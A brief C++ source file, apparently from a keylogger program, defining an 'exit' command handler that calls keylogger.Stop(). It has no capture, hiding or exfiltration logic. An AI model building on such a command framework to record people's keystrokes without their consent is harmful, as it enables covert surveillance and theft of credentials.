#include "stdafx.h"
#include "Command_exit.h"
#include "Keylogger.h"

Command_exit::Command_exit()
{
}

Command_exit::~Command_exit()
{
}

bool Command_exit::OnExecute(const std::vector<std::tstring> &args)
{
	keylogger.Stop();
	return true;
}
